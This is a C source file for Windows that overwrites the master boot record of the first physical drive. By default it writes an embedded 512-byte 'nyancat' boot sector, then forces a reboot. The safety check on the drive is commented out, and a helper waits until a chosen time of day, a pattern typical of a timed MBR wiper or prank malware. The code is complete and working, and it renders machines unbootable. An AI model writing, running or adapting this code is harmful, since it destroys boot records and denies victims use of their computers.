#include <Windows.h>
#include <Strsafe.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>
#include <ctime>

#include "common.h"

BYTE * get_file_contents(char * filename, int * size)
{
	int fd, pos, ret;
	BYTE * buffer;

	*size = MAX_SIZE;
	buffer = (BYTE *)malloc(*size);
	if(buffer == NULL)
	{
		printf("Malloc failed\n");
		return NULL;
	}

	memset(buffer, 0, *size);
	fd = _open(filename, O_RDONLY | O_BINARY);
	if(fd < 0)
	{
		printf("Could not open and read %s\n", filename);
		free(buffer);
		return NULL;
	}

	pos = 0;
	while((ret = _read(fd, buffer + pos, *size - pos)) > 0 && pos < *size)
	{
		printf("ret=%d pos=%d\n", ret, pos);
		pos += ret;
	}
	_close(fd);
	if(pos == 0)
	{
		printf("Could not read from file %s\n", filename);
		free(buffer);
		return NULL;
	}
	printf("Done reading file (%d bytes)\n", pos);
	return buffer;
}

int check_raw_drive(HANDLE rawdriveh)
{
	/* Commented out so I can overwrite the MBR multiple times
	BYTE originalMBR[512];
	DWORD numBytes = 512;

	//if it is not successful or it's not an MBR,
	if(rawdriveh == INVALID_HANDLE_VALUE ||
		ReadFile(rawdriveh, originalMBR, 512, &numBytes, 0) == FALSE ||
		numBytes != 512 ||
		originalMBR[510] != 0x55 ||
		originalMBR[511] != 0xAA)
	{
		printf("Cannot open disk or device not MBR-based\n");
		return 1;
	}
	*/
	return 0;
}

int write_mbr(BYTE * new_mbr, int size)
{
	DWORD numBytes;
	HANDLE rawdriveh;

	printf("Initial disk check...\n");
	rawdriveh = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(check_raw_drive(rawdriveh) != 0)
		return 1;

	//Write the new MBR!
	numBytes = 0;
	if(SetFilePointer(rawdriveh, 0, 0, 0) != 0 ||
		WriteFile(rawdriveh, new_mbr, size, &numBytes, 0) == FALSE ||
		numBytes != size)
	{
		printf("Error writing new MBR!\n");
		return 1;
	}

	CloseHandle(rawdriveh);
	printf("Wrote new MBR - should be all ready to reboot!\n");
	return 0;
}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
    ) 
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) )
    { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}

int reboot()
{
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	if(SetPrivilege(hToken, SE_SHUTDOWN_NAME, true))
	{
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0x80050000);
		printf("GetLastError=%lu\n", GetLastError());	
		return 0;
	}
	return 1;
}

// You must free the result if result is non-NULL.
char *str_replace(char *orig, char *rep, char *with) {
    char *result; // the return string
    char *ins;    // the next insert point
    char *tmp;    // varies
    int len_rep;  // length of rep
    int len_with; // length of with
    int len_front; // distance between rep and end of last rep
    int count;    // number of replacements

    if (!orig)
        return NULL;
    if (!rep)
        rep = "";
    len_rep = strlen(rep);
    if (!with)
        with = "";
    len_with = strlen(with);

    ins = orig;
    for (count = 0; tmp = strstr(ins, rep); ++count) {
        ins = tmp + len_rep;
    }

    // first time through the loop, all the variable are set correctly
    // from here on,
    //    tmp points to the end of the result string
    //    ins points to the next occurrence of rep in orig
    //    orig points to the remainder of orig after "end of rep"
    tmp = result = (char *) malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result)
        return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep; // move to next "end of rep"
    }
    strcpy(tmp, orig);
    return result;
}

int write_mbr_and_reboot(char * filename)
{
	BYTE * new_mbr;
	BYTE nyancat[512] = {
	  0x0e, 0x1f, 0x0e, 0x07, 0xfc, 0xb9, 0x14, 0x00, 0xbf, 0xbb, 0x7d, 0x0f,
	  0x31, 0x96, 0x31, 0xf0, 0xc1, 0xc6, 0x07, 0xab, 0xe2, 0xf5, 0xb8, 0x13,
	  0x00, 0xcd, 0x10, 0x68, 0x00, 0xa0, 0x07, 0x6a, 0x04, 0x6a, 0x00, 0xbd,
	  0x80, 0x02, 0x31, 0xff, 0xb8, 0x7e, 0x00, 0x31, 0xc9, 0x49, 0xf3, 0xaa,
	  0x68, 0x00, 0x50, 0x5f, 0xb1, 0x05, 0x57, 0x01, 0xef, 0xf7, 0xdd, 0xe8,
	  0x9c, 0x00, 0x5f, 0x83, 0xc7, 0x18, 0xe2, 0xf2, 0x01, 0xef, 0x68, 0x1b,
	  0x7d, 0x5e, 0xe8, 0xa5, 0x00, 0xe8, 0x9f, 0x00, 0x58, 0x5a, 0xa8, 0x01,
	  0x74, 0x04, 0xf7, 0xdd, 0xf7, 0xd2, 0xf7, 0xdd, 0x40, 0x52, 0x50, 0x29,
	  0xd7, 0xe8, 0x8b, 0x00, 0xb1, 0x05, 0xe8, 0x4a, 0x00, 0xe2, 0xfb, 0x81,
	  0xc7, 0xb4, 0x13, 0xe8, 0xa1, 0x00, 0x83, 0xc7, 0x14, 0xe8, 0x9b, 0x00,
	  0x83, 0xc7, 0x24, 0xe8, 0x95, 0x00, 0x83, 0xc7, 0x18, 0xe8, 0x8f, 0x00,
	  0xb1, 0x14, 0xbb, 0xbb, 0x7d, 0x8b, 0x3f, 0x58, 0x50, 0xc1, 0xe0, 0x04,
	  0x29, 0xc7, 0x31, 0xc0, 0x81, 0xff, 0x00, 0xe6, 0x77, 0x08, 0xbe, 0x9f,
	  0x7d, 0x53, 0xe8, 0x12, 0x00, 0x5b, 0x83, 0xc3, 0x02, 0xe2, 0xe2, 0x31,
	  0xc0, 0x99, 0xb1, 0x02, 0xb4, 0x86, 0xcd, 0x15, 0xe9, 0x73, 0xff, 0x31,
	  0xdb, 0xac, 0x93, 0xac, 0x92, 0xad, 0x92, 0x83, 0xfa, 0x01, 0x74, 0x09,
	  0x01, 0xd7, 0x89, 0xda, 0xe8, 0x03, 0x00, 0xeb, 0xef, 0xc3, 0x51, 0x57,
	  0x89, 0xd9, 0xf3, 0xaa, 0x5f, 0x81, 0xc7, 0x40, 0x01, 0x4a, 0x75, 0xf3,
	  0x59, 0xc3, 0x51, 0xb1, 0x05, 0x6a, 0x28, 0x58, 0x6a, 0x18, 0x5b, 0x6a,
	  0x0c, 0x5a, 0xe8, 0xe1, 0xff, 0x04, 0x04, 0xe2, 0xf3, 0x59, 0xc3, 0xe8,
	  0x00, 0x00, 0xad, 0x01, 0xc7, 0x31, 0xc0, 0xac, 0x91, 0xac, 0x93, 0xac,
	  0x99, 0x92, 0xac, 0x57, 0x52, 0xe8, 0xc6, 0xff, 0x5a, 0x5f, 0x80, 0xea,
	  0x08, 0x80, 0xc3, 0x08, 0x81, 0xc7, 0xfc, 0x04, 0xe2, 0xed, 0xc3, 0x57,
	  0x56, 0xe8, 0xd7, 0xff, 0x5e, 0x5f, 0xc3, 0x00, 0xfb, 0x03, 0x48, 0x48,
	  0x00, 0x0c, 0xf6, 0x02, 0x48, 0x40, 0x59, 0x10, 0xfb, 0x03, 0x38, 0x38,
	  0x3c, 0x38, 0x0f, 0x04, 0x28, 0x28, 0x00, 0x10, 0xf1, 0x03, 0x28, 0x20,
	  0x19, 0x10, 0x19, 0x04, 0xe2, 0x28, 0xec, 0x01, 0x00, 0x08, 0x00, 0xe4,
	  0x04, 0x1c, 0xf6, 0x01, 0x00, 0x04, 0x0f, 0xe4, 0xf5, 0x1c, 0xfb, 0x01,
	  0x00, 0x08, 0x41, 0xdc, 0x04, 0x2c, 0xf6, 0x01, 0x00, 0x04, 0x00, 0xd0,
	  0xe1, 0x00, 0xf6, 0x00, 0xf6, 0x00, 0xf6, 0x04, 0xf6, 0x04, 0xfb, 0x04,
	  0x00, 0x00, 0x00, 0x1c, 0xfb, 0x00, 0xf6, 0x04, 0xf6, 0x04, 0xfb, 0x04,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x13, 0x00, 0x00, 0x04,
	  0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x00,
	  0xf6, 0xf4, 0xfa, 0x04, 0xf1, 0x01, 0x00, 0x00, 0x00, 0x02, 0x08, 0x0c,
	  0x00, 0x08, 0xfb, 0x01, 0x08, 0x04, 0x19, 0x04, 0x0f, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0xec, 0x04, 0xfb, 0x04, 0x00, 0x00,
	  0x00, 0xf4, 0xf5, 0x00, 0x00, 0x04, 0x00, 0x04, 0xfb, 0x01, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
	};
	int size;

	if(!filename)
	{
		new_mbr = nyancat;
		size = sizeof(nyancat);
		printf("Using default mbr (nyancat)\n");
	}
	else
	{
		new_mbr = get_file_contents(filename, &size);
		if(!new_mbr)
			return 1;
	}
	if(write_mbr(new_mbr, size))
		return 1;
	return reboot();
}

char * translate_path(LPCTSTR env_var, char * cenv_var, char * path)
{
	TCHAR tbuffer[4096];
	char buffer[4096];
	char * new_path;

	memset(tbuffer, 0, sizeof(tbuffer));
	if(!GetEnvironmentVariable(env_var, tbuffer, sizeof(tbuffer)/sizeof(tbuffer[0])))
	{
		printf("Could not get Environment Var %s (Error = %d)\n", cenv_var, GetLastError());
		return path;
	}

	memset(buffer, 0, sizeof(buffer));//stupid windows strings
	wcstombs(buffer, tbuffer, sizeof(buffer));

	new_path = str_replace(path, cenv_var, buffer);
	if(!new_path)
		return path;
	return new_path;
}

void wait_until(int hour, int min)
{
	time_t t;
	struct tm * now;
	printf("Waiting until %d:%d\n", hour, min);
	while(true)
	{
		t = time(0);
		now = localtime(&t);
		if(now->tm_hour > hour || (now->tm_hour == hour && now->tm_min >= min))
			break;
		_sleep(5*1000);
	}
}